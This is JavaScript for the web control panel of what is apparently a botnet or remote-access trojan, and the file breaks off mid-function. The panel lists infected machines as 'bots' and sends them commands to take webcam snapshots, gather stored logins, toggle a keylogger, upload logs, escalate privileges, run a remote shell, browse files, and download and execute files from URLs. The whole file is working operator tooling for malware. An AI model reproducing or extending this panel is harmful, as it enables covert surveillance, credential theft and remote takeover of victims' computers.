var mousex = null;
var mousey = null;
document.addEventListener('mousemove', onMouseUpdate, false);
document.addEventListener('mouseenter', onMouseUpdate, false);
function onMouseUpdate(e) {
    mousex = e.pageX;
    mousey = e.pageY;
}
function loaded(){
	var pbtns = document.getElementsByClassName('progress-button');
	for (var i = 0; i < pbtns.length; i++) {
		if (pbtns[i].title=='Login') {
			pbtns[i].removeAttribute('disabled');
			pbtns[i].addEventListener('click',function(){
				this.classList.add('progress-loading');
				this.setAttribute('disabled','');
				finishloading('login');
			})
			document.getElementById('user').onkeyup=function(e){
				if(e.keyCode==13){
					document.getElementsByClassName('progress-button')[0].classList.add('progress-loading');
					document.getElementsByClassName('progress-button')[0].setAttribute('disabled','');
					finishloading('login');
				}
			}
			document.getElementById('pass').onkeyup=document.getElementById('user').onkeyup;
		}
	}
	var ref = document.getElementsByClassName('buttonspinleft')[0];
	if(ref !== undefined){
		ref.onmouseover=function(){playsound(15);};
		ref.addEventListener('click',dobots);
	}
	if (document.getElementById('bots-sort') != null){
		document.getElementById('bots-sort').addEventListener('change',function(){
			switch(this.value){
				case '0':
					playsound(9);
					break;
				case '1':
					playsound(10);
					break;
				case '2':
					playsound(3);
					break;
			}
			dobots();
		});
		document.getElementById('bots-sort').onmouseover=function(){playsound(11);};
		var As = document.getElementsByTagName('a');
		for (var i = As.length - 1; i >= 0; i--) {
			switch(As[i].title){
				case "Check database info":
				case "Show database's settings":
					As[i].addEventListener('click',function(){
						showsettings('database');
						var err = document.getElementById('dberror');
						if(!err === undefined){err.parentNode.removeChild(err);}
					})
					As[i].onmouseover=function(){playsound(18);}
					break;
				case "Show access' settings":
					As[i].addEventListener('click',function() {
						showsettings('access');
					});
					As[i].onmouseover=function(){playsound(16);}
					break;
				case "Show sessions' settings":
					As[i].addEventListener('click',function() {
						showsettings('sessions');
					});
					As[i].onmouseover=function(){playsound(17);}
					break;
				case "Show bots' advanced control":
					As[i].addEventListener('click',function() {
						showsettings('bots');
					});
					As[i].onmouseover=function(){playsound(21);}
					break;
				case "Show CPanel's settings":
					As[i].addEventListener('click',function() {
						showsettings('cpanel');
					});
					As[i].onmouseover=function(){playsound(22);}
					break;
        case "Show Statics":
					As[i].addEventListener('click',function() {
						showsettings('statics');
					});
					As[i].onmouseover=function(){playsound(22);}
					break;
			}
		}
	}
	var logoutelm = document.getElementsByClassName('logout')[0];
	if(logoutelm !== undefined){
		logoutelm.addEventListener('click',logout);
		logoutelm.onmouseover=function(){playsound(14);};
	}
	var btns = document.getElementsByTagName('button');
	for (var i = 0; i < btns.length; i++) {
		if (btns[i].title!==undefined){
			switch(btns[i].title){
				case 'Check or Uncheck All bots':
					btns[i].addEventListener('click',function(){
						var chks = document.getElementById('bots-list').getElementsByTagName('input');
						var wc = this.getAttribute('wc');
						if (wc=='c'){
							for (var ii = 0; ii < chks.length; ii++){
								if(!chks[ii].checked){chks[ii].checked=true;}
							}
							this.setAttribute('wc','u');
							this.innerHTML='Uncheck all';
						}else{
							for (var ii = 0; ii < chks.length; ii++){
								if(chks[ii].checked){chks[ii].checked=false;}
							}
							this.setAttribute('wc','c');
							this.innerHTML='Check all';
						}
					})
					btns[i].onmouseover=function(){playsound(19);}
					break;
				case 'Do selected action':
					btns[i].addEventListener('click',function(){
						var chks = document.getElementById('bots-list').getElementsByTagName('input');
						var nwt = 300000;
						var awt = 0;
						for (var ii = 0; ii < chks.length; ii++){
							if(chks[ii].checked){
								switch(document.getElementById('actions').value){
									case "0":
										if(awt == 0){awt = prompt('Write the new wait time [Defualt: 300000]:',nwt);}
										if(awt != null){nwt=awt;}
										httpGet(window.location.href,'POST',function(a){
											shownotify(a);
										},'do=cmd&botid='+chks[ii].parentNode.parentNode.parentNode.id+'&cmd=cwt '+nwt)
										break;
									case "1":
										httpGet(window.location.href,'POST',function(a){
											shownotify(a);
										},'do=cmd&botid='+chks[ii].parentNode.parentNode.parentNode.id+'&cmd=wcs')
										break;
									case "2":
										httpGet(window.location.href,'POST',function(a){
											shownotify(a);
										},'do=cmd&botid='+chks[ii].parentNode.parentNode.parentNode.id+'&cmd=logins')
										break;
									case "3":
										httpGet(window.location.href,'POST',function(a){
											shownotify(a);
										},'do=cmd&botid='+chks[ii].parentNode.parentNode.parentNode.id+'&cmd=idle')
										break;
									case "4":
										httpGet(window.location.href,'POST',function(a){
											shownotify(a);
										},'do=cmd&botid='+chks[ii].parentNode.parentNode.parentNode.id+'&cmd=enlogger')
										break;
									case "5":
										httpGet(window.location.href,'POST',function(a){
											shownotify(a);
										},'do=cmd&botid='+chks[ii].parentNode.parentNode.parentNode.id+'&cmd=dislogger')
										break;
									case "6":
										httpGet(window.location.href,'POST',function(a){
											shownotify(a);
										},'do=cmd&botid='+chks[ii].parentNode.parentNode.parentNode.id+'&cmd=logs')
										break;
									case "7":
										httpGet(window.location.href,'POST',function(a){
											shownotify(a);
										},'do=cmd&botid='+chks[ii].parentNode.parentNode.parentNode.id+'&cmd=gh')
										break;
								}
							}
						}
					})
					btns[i].onmouseover=function(){playsound(20);}
					break;
			}
		}
	}
	if(typeof bg_time !== 'undefined' && bg_time != 0){setTimeout(backgroundtunning,bg_time);}
	var sound = document.getElementById('nosound');
	sound.onclick=function(){
		if(sound.getAttribute("play")=="n"){sound.setAttribute("play","y");playnosound=false;}else{sound.setAttribute("play","n");playnosound=true;}
	}
}
function gettime(typ='m'){
	var currentTime = new Date();
	var hours = currentTime.getHours();
	var minutes = currentTime.getMinutes();
	var seconds = currentTime.getSeconds();
	var suffix = "AM";
	if(hours >= 12){suffix = "PM";hours = hours - 12;}
	if(hours == 0){hours = 12;}
	if(minutes < 10){minutes = "0" + minutes;}
	var resu = hours * 3600;
	resu = resu + (minutes*60);
	resu = resu + seconds;
	if(typ=='m'){return hours + ":" + minutes + ":" + seconds + " " + suffix;}
	return resu;
}
function backgroundtunning(){
	var elm = document.getElementsByClassName("bg-img")[0];
	var bg = "imgs/background.php?bla="+getrand();
	elm.setAttribute("src",bg);
	elm.classList.add("just-viewing");
	setTimeout(function(){
		elm.classList.remove("just-viewing");
	},3000);
	setTimeout(backgroundtunning,bg_time);
}
function finishloading(typ){
	switch(typ){
		case "login":
			setTimeout(loginresult,5000);
			break;
		case 'submit changes':
			var elm = document.getElementById('submit-logins');
			elm.classList.remove('progress-loading');
			elm.removeAttribute('disabled','');
			break;
	}
}
function loginresult() {
	var elms = document.getElementsByTagName('button');
	for (var i = elms.length - 1; i >= 0; i--){
		if(elms[i].title=='Login'){
			elms[i].classList.remove('progress-loading');
			elms[i].removeAttribute('disabled');
			httpGet(window.location.href,'POST',function(val){
				var elm = document.getElementById('login-des');
				if(val==''){
						elm.innerHTML='Authorized';
						playsound(4);
						elm.classList.add('login-success');
						setTimeout(function(){
							window.location.href=window.location.href;
						},3000);
						return true;
				}else{
					elm.innerHTML=val;
					switch(val){
						case "Password cannot be skipped!":
							playsound(5);
							break;
						case "User was not given or empty!":
							playsound(6);
							break;
						case "Password is not correct!":
							playsound(7);
							break;
						case "User is not correct!":
							playsound(8);
							break;
					}
					elm.classList.remove('login-error')
					elm.classList.add('login-error');
					setTimeout(function(){
						document.getElementById('login-des').classList.remove('login-error');
						document.getElementById('login-des').innerHTML='';
					},3000);
					return false;
				}
			},'do=login&user='+document.getElementById('user').value+'&pass='+document.getElementById('pass').value);
		}
	}
}
function showmenu(x,y,id){
	httpGet(window.location.href,'POST',function(a,x_=x,y_=y,id_=id){
		var oldon = document.onclick;
		var insert = false;
		var elm = document.getElementsByClassName('menu')[0];
		if(elm === undefined){insert=true;elm = document.createElement('div')};
		elm.className='menu';
		elm.innerHTML=a;
		elm.style.top=y_+'px';
		elm.style.left=x_+'px';
		elm.setAttribute('bot',id_);
		var elms = elm.getElementsByClassName('menu-item');
		for (var i = 0; i < elms.length; i++) {
			elms[i].addEventListener('click',function(){
				switch(this.title){
					case "Change wait time":
						var nwt = 30000;
						var awt = prompt('Write the new wait time [Defualt: 30000]:',nwt);
						if(awt != null){nwt=awt;}
						httpGet(window.location.href,'POST',function(a){
							shownotify(a);
						},'do=cmd&botid='+this.parentNode.getAttribute('bot')+'&cmd=cwt '+nwt)
						break;
					case "Take a webcam snap":
						httpGet(window.location.href,'POST',function(a){
							shownotify(a);
						},'do=cmd&botid='+this.parentNode.getAttribute('bot')+'&cmd=wcs')
						break;
					case "Gather logins":
						httpGet(window.location.href,'POST',function(a){
							shownotify(a);
						},'do=cmd&botid='+this.parentNode.getAttribute('bot')+'&cmd=logins')
						break;
					case "What's idle time?":
						httpGet(window.location.href,'POST',function(a){
							shownotify(a);
						},'do=cmd&botid='+this.parentNode.getAttribute('bot')+'&cmd=idle')
						break;
					case "Enable Keyslogger":
						httpGet(window.location.href,'POST',function(a){
							shownotify(a);
						},'do=cmd&botid='+this.parentNode.getAttribute('bot')+'&cmd=enlogger')
						break;
					case "Disable Keyslogger":
						httpGet(window.location.href,'POST',function(a){
							shownotify(a);
						},'do=cmd&botid='+this.parentNode.getAttribute('bot')+'&cmd=dislogger')
						break;
					case "Send all logs":
						httpGet(window.location.href,'POST',function(a){
							shownotify(a);
						},'do=cmd&botid='+this.parentNode.getAttribute('bot')+'&cmd=logs')
						break;
					case "Get Higher":
						httpGet(window.location.href,'POST',function(a){
							shownotify(a);
						},'do=cmd&botid='+this.parentNode.getAttribute('bot')+'&cmd=gh')
						break;
				}
				document.body.removeChild(this.parentNode);document.onclick=oldon;
			})
		}
		if(insert){
			document.body.insertBefore(elm,document.body.firstChild);
			document.onclick = function(e,oo=oldon,el=elm){
				if (e.clientY > (el.offsetHeight+getOffset(el).top) || e.clientX > (el.offsetWidth+getOffset(el).left)){document.body.removeChild(el);document.onclick=oo;}
				if (e.clientY < getOffset(el).top || e.clientX < getOffset(el).left){document.body.removeChild(el);document.onclick=oo;}
			}
		}
	},'do=menu')
}
function httpGet(url,method,callback,data=null){
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() {
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            callback(xmlHttp.responseText);
    }
    xmlHttp.open(method, url, true);
    if (method.toLowerCase()=='post') {xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");}
    xmlHttp.setRequestHeader('User-Agent',navigator.userAgent);
    xmlHttp.send(data);
}
function logout(){httpGet(window.location.href,'POST',function(a){window.location.href=window.location.href;},'do=logout');}
function showsettings(section='cpanel'){
	httpGet(window.location.href,'POST',function(a,s=section){
		var insert = false;
		var cover = document.getElementsByClassName('cover')[0];
		if(cover === undefined){insert=true;cover = document.createElement('div')};
		cover.className='cover';
		if (insert){document.body.insertBefore(cover,document.body.firstChild);}
		var elm = document.getElementsByClassName('settings-view')[0];
		if(elm === undefined){elm = document.createElement('div')};
		elm.className='settings-view cpanel';
		elm.innerHTML=a;
		if(s!='cpanel' && s != null && s !== undefined){
			elm.classList.remove('database');
			elm.classList.remove('bots');
			elm.classList.remove('access');
			elm.classList.remove('cpanel');
			elm.classList.remove('sessions');
			elm.classList.remove('statics');
			elm.classList.add(s);
		}
		if (insert){document.body.insertBefore(elm,document.body.firstChild);}
		elm.classList.add('showing');
		document.onclick = function(e){
			if (e.clientY > (elm.offsetHeight+getOffset(elm).top) || e.clientX > (elm.offsetWidth+getOffset(elm).left)){document.body.removeChild(elm);document.body.removeChild(cover);document.onclick=null;}
			if (e.clientY < getOffset(elm).top || e.clientX < getOffset(elm).left){document.body.removeChild(elm);document.body.removeChild(cover);document.onclick=null;}
		}
		setTimeout(dosettings,1000);
	},'do=settings');
}
function dobots(){
	var sort = (document.getElementById('bots-sort') == null )?'':document.getElementById('bots-sort').value;
	httpGet(window.location.href,'POST',function(a){
		var elm = document.getElementById('bots-list');
		if(a.indexOf('|') >= 0){
			var spn = document.createElement('span');
			var a_arr = a.split('|');
			document.getElementById('bots-count').innerHTML='Total bots: '+a_arr[0]+' - ';
			for (var i = a_arr.length - 2; i >= 1; i--) {
				spn.innerHTML+=a_arr[i];
			}
			var botz = spn.getElementsByTagName('div');
			var addedbots = false;
			for (var i = botz.length - 1; i >= 0; i--) {
				var chk = document.getElementById(botz[i].id);
				if(chk == null){
					botz[i].addEventListener('click',function(e){
						if (e.target.nodeName!='INPUT'){dobot(this.id);}
					});
					botz[i].addEventListener('contextmenu',function(e){
						e.preventDefault();
						if (e.target.nodeName!='INPUT'){
							var mY;
							var mX;
							var mw = 25/100*screen.width;
							var mh = 15/100*screen.height;
							if ((e.clientX+mw) < screen.width){mX=e.clientX;}else{mX=(screen.width-mw);}
							if ((e.clientY+mh) < screen.height){mY=e.clientY;}else{mY=(screen.height-mh);}
							showmenu(mX,mY,this.id);
						}
					})
					elm.appendChild(botz[i]);
					addedbots = true;
				}else{
					chk.innerHTML=botz[i].innerHTML;
				}
			}
			if(addedbots){playsound(12);}
		}else{
			if(a=="reload"){window.location.href=window.location.href;}
			elm.innerHTML='<BR><BR><BR>'+a;
			return;
		}
		var existbots = elm.getElementsByTagName('div');
		var deletedbots = false;
		for (var i = existbots.length - 1; i >= 0; i--) {
			if(a.indexOf("<div id='"+existbots[i].id+"'") <= 0){
				elm.removeChild(document.getElementById(existbots[i].id));
				deletedbots = true;
			}
		}
		if(deletedbots){playsound(13);}
		setTimeout(dobots,10000);
	},'do=bots&sort='+sort);
}
function getOffset(el) {
	el = el.getBoundingClientRect();
	return {
		left: el.left + window.scrollX,
		top: el.top + window.scrollY
	}
}
function dosettings() {
	var elms = document.getElementsByClassName('tab');
	var elm = document.getElementsByClassName('settings-view')[0];
	for (var i = elms.length - 1; i >= 0; i--) {
		switch(elms[i].title){
			case "Bots' settings":
				elms[i].addEventListener('click', function(){
					elm.classList.remove('bots');
					elm.classList.remove('cpanel');
					elm.classList.remove('database');
					elm.classList.remove('access');
					elm.classList.remove('sessions');
					elm.classList.remove('statics');
					elm.classList.add('bots');
				})
				break;
			case "Access' settings":
				elms[i].addEventListener('click', function(){
					elm.classList.remove('bots');
					elm.classList.remove('cpanel');
					elm.classList.remove('database');
					elm.classList.remove('access');
					elm.classList.remove('sessions');
					elm.classList.remove('statics');
					elm.classList.add('access');
				})
				document.getElementById('logins').addEventListener('change',function(){
					var inputs = document.getElementsByClassName('input');
					for (var ii = 0; ii < inputs.length; ii++) {
						switch(inputs[ii].title){
							case "Username Edit":
							case "Password Edit":
								inputs[ii].value=(inputs[ii].title=='Username Edit') ? document.getElementById('logins').value.split(' - ')[0] : document.getElementById('logins').value.split(' - ')[1];
								break;
						}
					}
				})
				var inputs = document.getElementsByClassName('input');
				for (var ii = 0; ii < inputs.length; ii++) {
					switch(inputs[ii].title){
						case "UserAgent":
						case "Cookie Name":
						case "Cookie Timeout":
							inputs[ii].addEventListener('keyup',function(){
								httpGet(window.location.href,'POST',function(a){
									// body...
								},'do=update&setting='+getsection(this.title)+'&value='+this.value)
							})
							break;
						case "Username Edit":
						case "Password Edit":
							inputs[ii].value=(inputs[ii].title=='Username Edit') ? document.getElementById('logins').value.split(' - ')[0] : document.getElementById('logins').value.split(' - ')[1];
							document.getElementById('submit-logins').addEventListener('click',function(){
								this.classList.add('progress-loading');
								this.setAttribute('disabled','');
								setTimeout(function() {
									finishloading('submit changes');
									var endstr = 'do=update&setting=';
									if (document.getElementById('logins').value.split(' - ')[0]!=document.getElementById('useredit').value){
										httpGet(window.location.href,'POST',function(a){
											//
										},endstr+document.getElementById('logins').value.split(' - ')[0]+'&value='+document.getElementById('useredit').value+'&login=1')
									}
									if (document.getElementById('logins').value.split(' - ')[1]!=document.getElementById('passedit').value){
										httpGet(window.location.href,'POST',function(a){
											//
										},endstr+document.getElementById('useredit').value+'&value='+document.getElementById('passedit').value+'&login=1&password=1')
									}
									httpGet(window.location.href,'POST',function(a){
										document.getElementById('logins').innerHTML=a;
										document.getElementById('useredit').value=document.getElementById('logins').value.split(' - ')[0];
										document.getElementById('passedit').value=document.getElementById('logins').value.split(' - ')[1];
									},'do=logins')
								},2000);
							})
							break;
							case 'Login Needed':
								inputs[ii].addEventListener('click',function(){
									var endstr = (this.checked) ? 'true' : 'false';
									httpGet(window.location.href,'POST',function(a){
										// body...
									},'do=update&setting='+getsection(this.title)+'&value='+endstr)
								})
								break;
					}
				}
				break;
			case "Sessions' settings":
				elms[i].addEventListener('click', function(){
					elm.classList.remove('bots');
					elm.classList.remove('cpanel');
					elm.classList.remove('database');
					elm.classList.remove('access');
					elm.classList.remove('sessions');
					elm.classList.remove('statics');
					elm.classList.add('sessions');
				})
				var dlt = document.getElementById('dlt-session');
				dlt.addEventListener('click',function(){
					var chks = document.getElementsByClassName('chkbx').length;
					for (var ii = 0; ii < chks; ii++) {
						var chk = document.getElementsByClassName('chkbx')[0];
						if (chk.checked){
							httpGet(window.location.href,'POST',function(a){
								// body...
							},'do=delete&session='+chk.getAttribute('session'))
							chk.parentNode.parentNode.parentNode.removeChild(chk.parentNode.parentNode);
						}
					}
				})
				break;
			case "Database's settings":
				elms[i].addEventListener('click', function(){
					elm.classList.remove('bots');
					elm.classList.remove('cpanel');
					elm.classList.remove('database');
					elm.classList.remove('access');
					elm.classList.remove('sessions');
					elm.classList.remove('statics');
					elm.classList.add('database');
				})
				var inputs = document.getElementsByClassName('input');
				for (var ii = 0; ii < inputs.length; ii++) {
					switch(inputs[ii].title){
						case "Database Name":
						case "Database Host":
						case "Database Username":
						case "Database Password":
							inputs[ii].addEventListener('keyup',function(){
								httpGet(window.location.href,'POST',function(a){
									// body...
								},'do=update&setting='+getsection(this.title)+'&value='+this.value)
								dobots();
							})
							break;
					}
				}
				break;
      case "CPanel's settings":
				elms[i].addEventListener('click', function(){
					elm.classList.remove('bots');
					elm.classList.remove('cpanel');
					elm.classList.remove('database');
					elm.classList.remove('access');
					elm.classList.remove('sessions');
					elm.classList.remove('statics');
					elm.classList.add('cpanel');
				})
				break;
      case "Statics":
				elms[i].addEventListener('click', function(){
					elm.classList.remove('bots');
					elm.classList.remove('cpanel');
					elm.classList.remove('database');
					elm.classList.remove('access');
					elm.classList.remove('sessions');
					elm.classList.remove('statics');
					elm.classList.add('statics');
				})
				break;
		}
	}
}
function getsection(a){
	switch(a){
		case "Database Name":
			return 'dbname';
			break;
		case "Database Host":
			return 'dbhost';
			break;
		case "Database Username":
			return 'dbuser';
			break;
		case "Database Password":
			return 'dbpass';
			break;
		case "UserAgent":
			return 'useragent';
			break;
		case "Cookie Name":
			return 'cookiename';
			break;
		case "Cookie Timeout":
			return 'cookietimeout';
			break;
		case "Login Needed":
			return 'loginneed';
			break;
	}
}
function dobot(id){
	httpGet(window.location.href,'POST',function(a){
		var oldon = document.onclick;
		var insert = false;
		var cover = document.getElementsByClassName('cover')[0];
		if(cover === undefined){insert=true;cover = document.createElement('div')};
		cover.className='cover';
		cover.setAttribute("type","bot");
		if (insert){document.body.insertBefore(cover,document.body.firstChild);}
		var elm = document.getElementsByClassName('bot-control')[0];
		if(elm === undefined){elm = document.createElement('div');}
		elm.className='bot-control';
		elm.innerHTML=a;
		var tt = elm.getElementsByClassName("title")[0];
		tt.addEventListener('contextmenu',function(e,id_=id){
			e.preventDefault();
			if (e.target.nodeName!='INPUT'){
				var mY;
				var mX;
				var mw = 25/100*screen.width;
				var mh = 15/100*screen.height;
				if ((e.clientX+mw) < screen.width){mX=e.clientX;}else{mX=(screen.width-mw);}
				if ((e.clientY+mh) < screen.height){mY=e.clientY;}else{mY=(screen.height-mh);}
				showmenu(mX,mY,id_);
			}
		})
		if (insert){document.body.insertBefore(elm,document.body.firstChild);}
		var navbtns = document.getElementsByClassName('nav-button');
		var imgvwr = document.getElementsByClassName('image-viewer')[0];
		var imgtyp = document.getElementById("img-type");
		imgtyp.onchange=function(){
			httpGet(imgvwr.getAttribute("folder")+"/index.php?do=img-n&n=-1&t="+imgtyp.value,'GET',function(aa){
				if(aa.includes("|")){
					var aaa = aa.split("|");
					if(aaa[0].toLowerCase()=="error"){
						alert(aaa[1]);
					}else{
						imgvwr.setAttribute('src',aaa[1]);
						imgvwr.setAttribute("title",aaa[1].split("=")[aaa[1].split("=").length -1]);
						imgvwr.setAttribute('at',aaa[2]);
					}
				}
			},"");
		}
		for (var i = 0; i < navbtns.length; i++) {
			switch(navbtns[i].title){
				case 'Next':
					navbtns[i].addEventListener('click',function(){
						var n = imgvwr.getAttribute("at");
						if(n==null){n=-1;}
						httpGet(imgvwr.getAttribute("folder")+"/index.php?do=img-n&n="+n+"&t="+imgtyp.value,'GET',function(aa){
							if(aa.includes("|")){
								var aaa = aa.split("|");
								if(aaa[0].toLowerCase()=="error"){
									alert(aaa[1]);
								}else{
									imgvwr.setAttribute('src',aaa[1]);
									imgvwr.setAttribute("title",aaa[1].split("=")[aaa[1].split("=").length -1]);
									imgvwr.setAttribute('at',aaa[2]);
								}
							}
						},"");
					})
					break;
				case 'Previous':
					navbtns[i].addEventListener('click',function(){
						var n = imgvwr.getAttribute("at");
						if(n==null){n=0;}
						httpGet(imgvwr.getAttribute("folder")+"/index.php?do=img-p&n="+n+"&t="+imgtyp.value,'GET',function(aa){
							if(aa.includes("|")){
								var aaa = aa.split("|");
								if(aaa[0].toLowerCase()=="error"){
									alert(aaa[1]);
								}else{
									imgvwr.setAttribute('src',aaa[1]);
									imgvwr.setAttribute("title",aaa[1].split("=")[aaa[1].split("=").length -1]);
									imgvwr.setAttribute('at',aaa[2]);
								}
							}
						},"");
					})
					break;
			}
		}
		imgvwr.addEventListener('load',function(){
			imgvwr.classList.add('just-viewing');
			setTimeout(function(){
				imgvwr.classList.remove('just-viewing');
			},3000)
		})
		document.onclick = function(e){
			if (e.clientY > (elm.offsetHeight+getOffset(elm).top) || e.clientX > (elm.offsetWidth+getOffset(elm).left)){document.body.removeChild(elm);document.body.removeChild(cover);document.onclick=oldon;}
			if (e.clientY < getOffset(elm).top || e.clientX < getOffset(elm).left){document.body.removeChild(elm);document.body.removeChild(cover);document.onclick=oldon;}
		}
		elm.classList.add('showing');
		dolivecontrol(id);
	},'do=bot&botid='+id)
}
function dolivecontrol(id) {
	httpGet(window.location.href,'POST',function(a){
		var elm = document.getElementById("livecontrol");
		if (elm == null){return;}
		if (a.indexOf("Live control is not available.") < 0){
			if(elm.innerHTML.indexOf("rcmdline") < 0){
				elm.innerHTML = a;
				var rcmd = document.getElementById("rcmdline");
				rcmdline.onkeyup=function(e){
					var charCode = (typeof e.which === "number") ? e.which : e.keyCode;
					if(charCode==13){
						httpGet(window.location.href,'POST',function(a){
							shownotify(a);
						},'do=cmd&botid='+id+'&cmd=rcmd '+rcmd.value);
						rcmd.value = "";
					}
				}
				var lct = document.getElementsByClassName("livecontrol-table")[0];
				var as = lct.getElementsByTagName("a");
				for (var i = as.length - 1; i >= 0; i--) {
					switch(as[i].title){
						case 'Remote Shell':
							as[i].onclick=function(){
								document.getElementById("lcd").className="lcd rcmd";
								lct.className="livecontrol-table rcmd";
								//
							}
							break;
						case 'File Manager':
							as[i].onclick=function(){
								document.getElementById("lcd").className="lcd fm";
								lct.className="livecontrol-table fm";
								//
							}
							break;
						case 'VNC Control':
							as[i].onclick=function(){
								document.getElementById("lcd").className="lcd vnc";
								lct.className="livecontrol-table vnc";
								//
							}
							break;
						case 'Commands Control Center':
							as[i].onclick=function(){
								document.getElementById("lcd").className="lcd ccc";
								lct.className="livecontrol-table ccc";
								//
							}
							break;
					}
				}
				var h = 24/100*screen.height;
				document.getElementById("rcmdlines").style.height=h+"px";
				playsound(1);
				setTimeout(function(){chkrcmd(id);},3000);
				fman("list");
			}
		}else{
			if(elm.innerHTML.indexOf("Live control is not available.") <= 0){elm.innerHTML = a;playsound(2);}
		}
		setTimeout(function(){
			dolivecontrol(id);
		},10000);
	},'do=livecontrol&botid='+id)
}
function chkrcmd(id){
	var rcmds = document.getElementById("rcmdlines");
	if(rcmds==null){return;}
	httpGet(window.location.href,'POST',function(a){
		if(a.startsWith('Error|')){
			shownotify(a.split("|")[1])
		}else{
			rcmds.value=a;
		}
		setTimeout(function(){chkrcmd(id);},10000);
	},'do=log&type=rcmd&botid='+id)
}
function startvnc(botid){
	alert('Not yet available');
}
function shownotify(msg){
	if (msg!=''){
		var oldon = document.onclick;
		var insert=false;
		var cover = document.getElementsByClassName('cover')[0];
		if (cover===undefined){insert=true;cover = document.createElement('div');}
		cover.className='cover';
		cover.setAttribute("type","");
		var elm = document.getElementsByClassName('notify')[0];
		if (elm===undefined){elm = document.createElement('div');}
		elm.className='notify';
		elm.innerHTML="<center><BR><BR>"+msg+"</center>";
		document.body.insertBefore(elm,document.body.firstChild);
		if(insert){
			var to = setTimeout(function(){
				document.body.removeChild(elm);
				document.body.removeChild(cover);
				document.onclick=oldon;
			},3000);
			document.body.insertBefore(cover,document.body.firstChild);
			document.onclick = function(e,oo=oldon){
				if (e.clientY > (elm.offsetHeight+getOffset(elm).top) || e.clientX > (elm.offsetWidth+getOffset(elm).left)){document.body.removeChild(elm);document.body.removeChild(cover);document.onclick=oo;clearTimeout(to);}
				if (e.clientY < getOffset(elm).top || e.clientX < getOffset(elm).left){document.body.removeChild(elm);document.body.removeChild(cover);document.onclick=oo;clearTimeout(to);}
			}
		}else{
			setTimeout(function(){
				document.body.removeChild(elm);
				cover = document.getElementsByClassName('cover')[0];
				if (cover!==undefined){cover.setAttribute("type","bot");}
			},3000);
		}
		elm.classList.add('showing');
	}
}
var playnosound = true;
var playingsound = false;
var playingtype = 0;
function playsound(type){
	if(playnosound){return;}
	var file = '';
	switch(type){
		case 1:
			file = "bot-online.mp3";
			break;
		case 2:
			file = "bot-offline.mp3";
			break;
		case 3:
			file = "both-shown.mp3";
			break;
		case 4:
			file = "authorized.mp3";
			break;
		case 5:
			file = "password-skipped.mp3";
			break;
		case 6:
			file = "user-skipped.mp3";
			break;
		case 7:
			file = "password-wronge.mp3";
			break;
		case 8:
			file = "user-wronge.mp3";
			break;
		case 9:
			file = "only-offline.mp3";
			break;
		case 10:
			file = "only-online.mp3";
			break;
		case 11:
			file = "sort-bots.mp3";
			break;
		case 12:
			file = "bots-added.mp3";
			break;
		case 13:
			file = "bots-removed.mp3";
			break;
		case 14:
			file = "logout.mp3";
			break;
		case 15:
			file = "refresh-bots.mp3";
			break;
		case 16:
			file = "show-access.mp3";
			break;
		case 17:
			file = "show-sessions.mp3";
			break;
		case 18:
			file = "show-database.mp3";
			break;
		case 19:
			file = "check-uncheck.mp3";
			break;
		case 20:
			file = "do-selected.mp3";
			break;
		case 21:
			file = "show-bots.mp3";
			break;
		case 22:
			file = "show-cpanel.mp3";
			break;
	}
	if (playingsound){
		if(playingtype==type){return;}
		setTimeout(function(){
			playsound(type);
		},500);
		return;
	}
	var audio = new Audio(window.location.href+"audios/"+file);
	audio.onended=function(){playingsound=false;};
	audio.play();
	playingsound = true;
	playingtype = type;
}
function getrand(length=32){
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for( var i=0; i < length; i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}
function fman(val){
	if(val==''){return;}
	var id = document.getElementById('bot-title').getAttribute('bot');
	var cmd = val;
	if(val.toLowerCase()=='list'){
		httpGet(window.location.href,'POST',function(a){
			var fp = document.getElementById('fman-p');
			if(a.indexOf("|") > 0){
				if(a.startsWith("Error|")){shownotify(a.split("|")[1]);return;}
				if(fp.innerHTML!=a.split("|")[0]){fp.innerHTML=a.split("|")[0];}
				var fv = document.getElementById('fman-v');
				if(fv.innerHTML!=a.split("|")[1]){fv.innerHTML=a.split("|")[1];}
			}
		},'do=fman&botid='+id);
		return;
	}
	if(val.toLowerCase()=='ref'){
		// Do nothing, it's already ready.
	}else if(val.toLowerCase()=='mkdir'){
		var res = prompt('Write the new folder\'s name','New Folder');
		if(res==null){return;}
		cmd += " " + res;
	}else if(val.toLowerCase()=='touch'){
		var res = prompt('Write the new file\'s name','New File.txt');
		if(res==null){return;}
		cmd += " " + res;
	}else if(val.toLowerCase()=='uf'){
		var res = prompt('Write the link of the file');
		if(res==null){return;}
		cmd += " " + res;
	}
	httpGet(window.location.href,'POST',function(a){
		shownotify(a);
		fman('list');
	},'do=cmd&botid='+id+'&cmd='+'fman '+cmd);
}
function fmanmenu(val){
	var typ = '';
	if(val.toLowerCase().startsWith('f')){typ='f';}
	if(val.toLowerCase().startsWith('d')){typ='d';}
	var f = remove(val,0,2);
	httpGet(window.location.href,'POST',function(a,x_=mousex,y_=mousey){
		var oldon = document.onclick;
		var insert = false;
		var elm = document.getElementsByClassName('menu')[0];
		if(elm === undefined){insert=true;elm = document.createElement('div')};
		elm.className='menu';
		elm.innerHTML=a;
		elm.style.top=y_+'px';
		elm.style.left=x_+'px';
		if(insert){
			document.body.insertBefore(elm,document.body.firstChild);
			document.onclick = function(e,oo=oldon,el=elm){
				if (e.clientY > (el.offsetHeight+getOffset(el).top) || e.clientX > (el.offsetWidth+getOffset(el).left)){document.body.removeChild(document.body.firstChild);document.onclick=oo;}
				if (e.clientY < getOffset(el).top || e.clientX < getOffset(el).left){document.body.removeChild(document.body.firstChild);document.onclick=oo;}
			}
		}
	},'do=fmanmenu&type='+typ+'&f='+f)
}
function ccc(val){
	if(val==''){return;}
	var id = document.getElementById('bot-title').getAttribute('bot');
	var cmd = val + " ";
	switch(val.toLowerCase()){
		case 'df':
			var f = prompt('Write the URL to download from');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'x':
			var f = prompt('Write the file name to execute');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'x -cmd':
			var f = prompt('Write the file name to execute');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'update':
			var f = prompt('Write the URL to update from');
			if(f==null || f==""){return;}
			cmd += f;
			break;
		case 'btcp':
